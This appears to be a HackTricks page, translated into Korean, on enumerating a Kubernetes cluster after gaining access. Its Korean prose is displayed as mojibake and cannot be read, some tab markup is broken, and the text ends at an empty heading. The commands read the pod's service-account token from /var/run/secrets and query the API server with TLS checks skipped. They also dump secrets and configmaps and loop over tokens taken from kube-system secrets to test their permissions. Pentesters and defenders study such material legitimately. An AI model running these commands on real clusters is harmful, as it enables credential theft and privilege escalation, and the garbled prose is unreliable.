# Kubernetes ì—´ê±°

{% hint style="success" %}
AWS í•´í‚¹ í•™ìŠµ ë° ì‹¤ìŠµ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP í•´í‚¹ í•™ìŠµ ë° ì‹¤ìŠµ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›</summary>

* [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—™ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ ìš”ë ¹ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}

## Kubernetes í† í°

ë§Œì•½ ë¨¸ì‹ ì— ì ‘ê·¼ì„ íƒˆì·¨í–ˆë‹¤ë©´ ì‚¬ìš©ìëŠ” ì¼ë¶€ Kubernetes í”Œë«í¼ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆì„ ê²ƒì…ë‹ˆë‹¤. í† í°ì€ ì¼ë°˜ì ìœ¼ë¡œ **í™˜ê²½ ë³€ìˆ˜ `KUBECONFIG`**ì— ì˜í•´ ê°€ë¦¬í‚¤ëŠ” íŒŒì¼ì´ë‚˜ **`~/.kube`** ë‚´ë¶€ì— ìœ„ì¹˜í•©ë‹ˆë‹¤.

ì´ í´ë”ì—ì„œ **API ì„œë²„ì— ì—°ê²°í•˜ê¸° ìœ„í•œ í† í° ë° êµ¬ì„±ì„ í¬í•¨í•˜ëŠ” êµ¬ì„± íŒŒì¼**ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ ì´ í´ë”ì—ëŠ” ì´ì „ì— ê²€ìƒ‰í•œ ì •ë³´ê°€ í¬í•¨ëœ ìºì‹œ í´ë”ë„ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë§Œì•½ Kubernetes í™˜ê²½ ë‚´ì˜ podë¥¼ íƒˆì·¨í–ˆë‹¤ë©´, í˜„ì¬ K8 í™˜ê²½ì— ëŒ€í•œ í† í° ë° ì •ë³´ë¥¼ ì°¾ì„ ìˆ˜ ìˆëŠ” ë‹¤ë¥¸ ìœ„ì¹˜ê°€ ìˆìŠµë‹ˆë‹¤:

### ì„œë¹„ìŠ¤ ê³„ì • í† í°

ê³„ì†í•˜ê¸° ì „ì—, Kubernetesì—ì„œ ì„œë¹„ìŠ¤ê°€ ë¬´ì—‡ì¸ì§€ ëª¨ë¥´ì‹ ë‹¤ë©´ **ì´ ë§í¬ë¥¼ ë”°ë¼ê°€ì„œ Kubernetes ì•„í‚¤í…ì²˜ì— ëŒ€í•œ ì •ë³´ë¥¼ ì ì–´ë„ ì½ì–´ë³´ì‹œê¸°ë¥¼ ê¶Œì¥í•©ë‹ˆë‹¤.**

Kubernetes [ë¬¸ì„œ](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server)ì—ì„œ ê°€ì ¸ì˜¨ ë‚´ìš©:

_"íŒŒë“œë¥¼ ìƒì„±í•  ë•Œ ì„œë¹„ìŠ¤ ê³„ì •ì„ ì§€ì •í•˜ì§€ ì•Šìœ¼ë©´ ë™ì¼í•œ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì˜_ ê¸°ë³¸ _ì„œë¹„ìŠ¤ ê³„ì •ì´ ìë™ìœ¼ë¡œ í• ë‹¹ë©ë‹ˆë‹¤."_

**ServiceAccount**ëŠ” Kubernetesì—ì„œ ê´€ë¦¬ë˜ëŠ” ê°ì²´ë¡œ, íŒŒë“œì—ì„œ ì‹¤í–‰ë˜ëŠ” í”„ë¡œì„¸ìŠ¤ì— ì‹ë³„ ì •ë³´ë¥¼ ì œê³µí•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.\
ê° ì„œë¹„ìŠ¤ ê³„ì •ì—ëŠ” í•´ë‹¹í•˜ëŠ” ë¹„ë°€ ì •ë³´ë¥¼ í¬í•¨í•˜ëŠ” ì‹œí¬ë¦¿ì´ ìˆìœ¼ë©°, ì´ ì‹œí¬ë¦¿ì—ëŠ” ë² ì–´ëŸ¬ í† í°ì´ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ë‘ ë‹¹ì‚¬ì ê°„ì— ì•ˆì „í•˜ê²Œ í´ë ˆì„ì„ í‘œí˜„í•˜ëŠ” ë°©ë²•ì¸ JSON Web Token (JWT)ì…ë‹ˆë‹¤.

ì¼ë°˜ì ìœ¼ë¡œ **ë‹¤ìŒ ì¤‘ í•˜ë‚˜**ì˜ ë””ë ‰í† ë¦¬ì— ìœ„ì¹˜í•©ë‹ˆë‹¤:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

ë‹¤ìŒ íŒŒì¼ì„ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **ca.crt**: Kubernetes í†µì‹ ì„ í™•ì¸í•˜ê¸° ìœ„í•œ ca ì¸ì¦ì„œì…ë‹ˆë‹¤.
* **namespace**: í˜„ì¬ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
* **token**: í˜„ì¬ podì˜ **ì„œë¹„ìŠ¤ í† í°**ì„ í¬í•¨í•©ë‹ˆë‹¤.

ì´ì œ í† í°ì„ ê°€ì§€ê³  ìˆìœ¼ë¯€ë¡œ, í™˜ê²½ ë³€ìˆ˜ **`KUBECONFIG`** ë‚´ì—ì„œ API ì„œë²„ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìì„¸í•œ ì •ë³´ëŠ” `(env | set) | grep -i "kuber|kube`**`"`**ë¥¼ ì‹¤í–‰í•˜ì„¸ìš”.

ì„œë¹„ìŠ¤ ê³„ì • í† í°ì€ **sa.key** íŒŒì¼ì— ì˜í•´ ì„œëª…ë˜ê³  **sa.pub**ì— ì˜í•´ ìœ íš¨ì„±ì´ ê²€ì‚¬ë©ë‹ˆë‹¤.

**Kubernetes**ì˜ ê¸°ë³¸ ìœ„ì¹˜:

* /etc/kubernetes/pki

**Minikube**ì˜ ê¸°ë³¸ ìœ„ì¹˜:

* /var/lib/localkube/certs

### í•« íŒŸ

_**í•« íŒŸ**_ì€ íŠ¹ê¶Œ ì„œë¹„ìŠ¤ ê³„ì • í† í°ì„ í¬í•¨í•˜ëŠ” podì…ë‹ˆë‹¤. íŠ¹ê¶Œ ì„œë¹„ìŠ¤ ê³„ì • í† í°ì€ ë¹„ë°€ ì •ë³´ë¥¼ ë‚˜ì—´í•˜ê±°ë‚˜ podë¥¼ ìƒì„±í•˜ëŠ” ë“±ì˜ íŠ¹ê¶Œ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì´ ìˆëŠ” í† í°ì…ë‹ˆë‹¤.

## RBAC

**RBAC**ê°€ ë¬´ì—‡ì¸ì§€ ëª¨ë¥´ì‹ ë‹¤ë©´, **ì´ ì„¹ì…˜ì„ ì½ì–´ë³´ì„¸ìš”.**

## ì—´ê±° ì°¨íŠ¸

K8s í™˜ê²½ì„ ì—´ê±°í•˜ë ¤ë©´ ë‹¤ìŒì´ í•„ìš”í•©ë‹ˆë‹¤:

* **ìœ íš¨í•œ ì¸ì¦ í† í°**. ì´ì „ ì„¹ì…˜ì—ì„œ ì‚¬ìš©ì í† í° ë° ì„œë¹„ìŠ¤ ê³„ì • í† í°ì„ ê²€ìƒ‰í•  ìœ„ì¹˜ë¥¼ ë³´ì•˜ìŠµë‹ˆë‹¤.
* **Kubernetes APIì˜ ì£¼ì†Œ (**_**https://host:port**_**)**. ì´ëŠ” ì¼ë°˜ì ìœ¼ë¡œ í™˜ê²½ ë³€ìˆ˜ ë°/ë˜ëŠ” kube êµ¬ì„± íŒŒì¼ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ì„ íƒ ì‚¬í•­**: **API ì„œë²„ë¥¼ í™•ì¸í•˜ëŠ” ca.crt**. ì´ëŠ” í† í°ì„ ì°¾ì„ ìˆ˜ ìˆëŠ” ê³³ê³¼ ë™ì¼í•œ ìœ„ì¹˜ì— ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” API ì„œë²„ ì¸ì¦ì„œë¥¼ í™•ì¸í•˜ëŠ” ë° ìœ ìš©í•˜ì§€ë§Œ `kubectl`ë¡œ `--insecure-skip-tls-verify` ë˜ëŠ” `curl`ë¡œ `-k`ë¥¼ ì‚¬ìš©í•˜ë©´ ì´ë¥¼ í•„ìš”ë¡œí•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

ì´ëŸ¬í•œ ì„¸ë¶€ ì •ë³´ë¥¼ ì‚¬ìš©í•˜ì—¬ **Kubernetesë¥¼ ì—´ê±°**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **API**ê°€ ì–´ë–¤ ì´ìœ ë¡œ **ì¸í„°ë„·ì„ í†µí•´ ì ‘ê·¼ ê°€ëŠ¥**í•˜ë‹¤ë©´ í•´ë‹¹ ì •ë³´ë¥¼ ë‹¤ìš´ë¡œë“œí•˜ì—¬ í˜¸ìŠ¤íŠ¸ì—ì„œ í”Œë«í¼ì„ ì—´ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ë³´í†µ **API ì„œë²„ëŠ” ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ì— ìˆìœ¼ë¯€ë¡œ**, íƒˆì·¨í•œ ë¨¸ì‹ ì„ í†µí•´ í„°ë„ì„ ìƒì„±í•˜ì—¬ í•´ë‹¹ ë¨¸ì‹ ì—ì„œ ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) ë°”ì´ë„ˆë¦¬ë¥¼ ì—…ë¡œë“œí•˜ê±°ë‚˜ `curl/wget/anything`ë¥¼ ì‚¬ìš©í•˜ì—¬ API ì„œë²„ì— ëŒ€í•œ ì›ì‹œ HTTP ìš”ì²­ì„ ìˆ˜í–‰í•´ì•¼ í•©ë‹ˆë‹¤.

### `list` ë° `get` ë™ì‚¬ ê°„ì˜ ì°¨ì´

**`get`** ê¶Œí•œì„ ì‚¬ìš©í•˜ë©´ íŠ¹ì • ìì‚°ì˜ ì •ë³´ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (`kubectl`ì˜ _`describe` ì˜µì…˜_).
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
ë§Œì•½ **`list`** ê¶Œí•œì„ ê°€ì§€ê³  ìˆë‹¤ë©´, íŠ¹ì • ìì‚° ìœ í˜•ì„ ë‚˜ì—´í•˜ê¸° ìœ„í•œ API ìš”ì²­ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (_`kubectl`ì˜ `get` ì˜µì…˜_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
ë§Œì•½ **`watch`** ê¶Œí•œì´ ìˆë‹¤ë©´, ìì‚°ì„ ëª¨ë‹ˆí„°ë§í•˜ê¸° ìœ„í•´ API ìš”ì²­ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
ê·¸ë“¤ì€ ë³€ê²½ë  ë•Œë§ˆë‹¤ (ë˜ëŠ” ìƒˆë¡œìš´ ê²ƒì´ ìƒì„±ë  ë•Œ) ì „ì²´ ë°°í¬ ë§¤ë‹ˆí˜ìŠ¤íŠ¸ë¥¼ ë°˜í™˜í•˜ëŠ” ìŠ¤íŠ¸ë¦¬ë° ì—°ê²°ì„ ì—½ë‹ˆë‹¤.

{% hint style="danger" %}
ë‹¤ìŒ `kubectl` ëª…ë ¹ì–´ëŠ” ê°ì²´ë¥¼ ë‚˜ì—´í•˜ëŠ” ë°©ë²•ë§Œ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ë°ì´í„°ì— ì•¡ì„¸ìŠ¤í•˜ë ¤ë©´ `get` ëŒ€ì‹  `describe`ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.
{% endhint %}

### curl ì‚¬ìš©

íŒŸ ë‚´ë¶€ì—ì„œ ì—¬ëŸ¬ í™˜ê²½ ë³€ìˆ˜ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
ê¸°ë³¸ì ìœ¼ë¡œ podëŠ” ë„ë©”ì¸ ì´ë¦„ `kubernetes.default.svc`ì—ì„œ **kube-api server**ì— **ì ‘ê·¼**í•  ìˆ˜ ìˆìœ¼ë©° **`/etc/resolv.config`**ì—ì„œ kube ë„¤íŠ¸ì›Œí¬ë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì—ì„œëŠ” kubernetes DNS ì„œë²„ì˜ ì£¼ì†Œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ë™ì¼í•œ ë²”ìœ„ì˜ ".1"ì€ kube-api ì—”ë“œí¬ì¸íŠ¸ì…ë‹ˆë‹¤).
{% endhint %}

### kubectl ì‚¬ìš©

í† í°ê³¼ API ì„œë²„ì˜ ì£¼ì†Œë¥¼ ê°€ì§€ê³  ìˆìœ¼ë©´ ë‹¤ìŒê³¼ ê°™ì´ kubectl ë˜ëŠ” curlì„ ì‚¬ìš©í•˜ì—¬ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

ê¸°ë³¸ì ìœ¼ë¡œ, APISERVERëŠ” `https://` ìŠ¤í‚¤ë§ˆë¡œ í†µì‹ í•©ë‹ˆë‹¤.
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> ë§Œì•½ urlì— `https://`ê°€ ì—†ìœ¼ë©´ Bad Requestì™€ ê°™ì€ ì˜¤ë¥˜ê°€ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[**ê³µì‹ kubectl ì¹˜íŠ¸ì‹œíŠ¸ëŠ” ì—¬ê¸°ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). ë‹¤ìŒ ì„¹ì…˜ì˜ ëª©í‘œëŠ” ì–»ì€ ìƒˆë¡œìš´ K8së¥¼ ì—´ê±°í•˜ê³  ì´í•´í•˜ê¸° ìœ„í•œ ë‹¤ì–‘í•œ ì˜µì…˜ì„ ì •ë ¬ëœ ë°©ì‹ìœ¼ë¡œ ì œì‹œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

`kubectl`ì´ ë³´ë‚´ëŠ” HTTP ìš”ì²­ì„ ì°¾ìœ¼ë ¤ë©´ `-v=8` ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### MitM kubectl - kubectl í”„ë¡ì‹œí™”
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### í˜„ì¬ êµ¬ì„±

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

ì¼ë¶€ ì‚¬ìš©ì ìê²© ì¦ëª…ì„ ë„ë‚œí–ˆë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì´ **ë¡œì»¬ë¡œ êµ¬ì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### ì§€ì›ë˜ëŠ” ë¦¬ì†ŒìŠ¤ ê°€ì ¸ì˜¤ê¸°

ì´ ì •ë³´ë¥¼ í†µí•´ ë‚˜ì—´í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì„œë¹„ìŠ¤ë¥¼ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### í˜„ì¬ ê¶Œí•œ í™•ì¸

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

ê¶Œí•œì„ í™•ì¸í•˜ëŠ” ë˜ ë‹¤ë¥¸ ë°©ë²•ì€ ë‹¤ìŒ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

**Kubernetes RBAC**ì— ëŒ€í•´ ë” ì•Œì•„ë³´ë ¤ë©´ ë‹¤ìŒì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**ì–´ë–¤ ê¶Œí•œì„ ê°€ì§€ê³  ìˆëŠ”ì§€** ì•Œê²Œ ë˜ë©´ ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì—¬ **ê·¸ ê¶Œí•œì„ ë‚¨ìš©í•  ìˆ˜ ìˆëŠ”ì§€** í™•ì¸í•˜ì‹­ì‹œì˜¤:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### ë‹¤ë¥¸ ì—­í•  ê°€ì ¸ì˜¤ê¸°

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ê°€ì ¸ì˜¤ê¸°

KubernetesëŠ” ë™ì¼í•œ ë¬¼ë¦¬ í´ëŸ¬ìŠ¤í„°ë¥¼ ë°±ì—…í•˜ëŠ” **ì—¬ëŸ¬ ê°€ìƒ í´ëŸ¬ìŠ¤í„°**ë¥¼ ì§€ì›í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ê°€ìƒ í´ëŸ¬ìŠ¤í„°ë¥¼ **ë„¤ì„ìŠ¤í˜ì´ìŠ¤**ë¼ê³  í•©ë‹ˆë‹¤.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### ë¹„ë°€ ê°€ì ¸ì˜¤ê¸°

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

ì‹œí¬ë¦¿ì„ ì½ì„ ìˆ˜ ìˆë‹¤ë©´, ë‹¤ìŒ ë¼ì¸ì„ ì‚¬ìš©í•˜ì—¬ ê° í† í°ê³¼ ê´€ë ¨ëœ ê¶Œí•œì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### ì„œë¹„ìŠ¤ ê³„ì • ê°€ì ¸ì˜¤ê¸°

ì´ í˜ì´ì§€ì˜ ì‹œì‘ ë¶€ë¶„ì—ì„œ ì„¤ëª…í•œ ëŒ€ë¡œ **íŒŸì´ ì‹¤í–‰ë  ë•Œ ì¼ë°˜ì ìœ¼ë¡œ ì„œë¹„ìŠ¤ ê³„ì •ì´ í• ë‹¹**ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ì„œë¹„ìŠ¤ ê³„ì •, ê·¸ë“¤ì˜ ê¶Œí•œ ë° ì‹¤í–‰ ìœ„ì¹˜ë¥¼ ë‚˜ì—´í•¨ìœ¼ë¡œì¨ ì‚¬ìš©ìê°€ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### ë°°í¬ ê°€ì ¸ì˜¤ê¸°

ë°°í¬ëŠ” ì‹¤í–‰í•´ì•¼ í•˜ëŠ” êµ¬ì„± ìš”ì†Œë¥¼ ì§€ì •í•©ë‹ˆë‹¤.
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### í¬ë“œ ê°€ì ¸ì˜¤ê¸°

í¬ë“œëŠ” ì‹¤ì œë¡œ ì‹¤í–‰ë  **ì»¨í…Œì´ë„ˆ**ì…ë‹ˆë‹¤.
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### ì„œë¹„ìŠ¤ ê°€ì ¸ì˜¤ê¸°

Kubernetes **ì„œë¹„ìŠ¤**ëŠ” **íŠ¹ì • í¬íŠ¸ì™€ IPì—ì„œ ì„œë¹„ìŠ¤ë¥¼ ë…¸ì¶œí•˜ëŠ” ë° ì‚¬ìš©**ë©ë‹ˆë‹¤ (ì‹¤ì œë¡œ ì„œë¹„ìŠ¤ë¥¼ ì œê³µí•˜ëŠ” íŒŸì— ëŒ€í•œ ë¡œë“œ ë°¸ëŸ°ì„œ ì—­í• ì„ í•©ë‹ˆë‹¤). ë‹¤ë¥¸ ì„œë¹„ìŠ¤ë¥¼ ì°¾ì•„ ê³µê²©ì„ ì‹œë„í•  ìˆ˜ ìˆëŠ” ìœ„ì¹˜ë¥¼ íŒŒì•…í•˜ëŠ” ë° ìœ ìš©í•©ë‹ˆë‹¤.
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### ë…¸ë“œ ê°€ì ¸ì˜¤ê¸°

**í´ëŸ¬ìŠ¤í„° ë‚´ì—ì„œ êµ¬ì„±ëœ ëª¨ë“  ë…¸ë“œ**ë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### ë°ëª¬ì…‹ ê°€ì ¸ì˜¤ê¸°

**ë°ëª¬ì…‹**ì€ í´ëŸ¬ìŠ¤í„°ì˜ ëª¨ë“  ë…¸ë“œ(ë˜ëŠ” ì„ íƒëœ ë…¸ë“œ)ì—ì„œ **íŠ¹ì • íŒŸì´ ì‹¤í–‰ ì¤‘ì¸ì§€** í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë°ëª¬ì…‹ì„ ì‚­ì œí•˜ë©´ í•´ë‹¹ ë°ëª¬ì…‹ìœ¼ë¡œ ê´€ë¦¬ë˜ëŠ” íŒŸë„ ì œê±°ë©ë‹ˆë‹¤.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
### í¬ë¡ ì¡ ê°€ì ¸ì˜¤ê¸°

í¬ë¡ ì¡ì„ ì‚¬ìš©í•˜ë©´ crontabê³¼ ìœ ì‚¬í•œ êµ¬ë¬¸ì„ ì‚¬ìš©í•˜ì—¬ ì¼ë¶€ ì‘ì—…ì„ ìˆ˜í–‰í•  íŒŒë“œì˜ ì‹¤í–‰ì„ ì˜ˆì•½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### configMap ê°€ì ¸ì˜¤ê¸°

configMapì—ëŠ” í•­ìƒ ì¿ ë²„ë„¤í‹°ìŠ¤ì—ì„œ ì‹¤í–‰ë˜ëŠ” ì•±ì— ì œê³µë˜ëŠ” ë§ì€ ì •ë³´ì™€ êµ¬ì„± íŒŒì¼ì´ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ë‚´ë¶€/ì™¸ë¶€ ì„œë¹„ìŠ¤ì— ì—°ê²°í•˜ê³  ì¸ì¦í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ë§ì€ ë¹„ë°€ë²ˆí˜¸, ë¹„ë°€ ë° í† í°ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### "ëª¨ë‘" ê°€ì ¸ì˜¤ê¸°

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **Pod ì†Œë¹„ëŸ‰ ê°€ì ¸ì˜¤ê¸°**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
### íŒŒë“œì—ì„œ íƒˆì¶œí•˜ê¸°

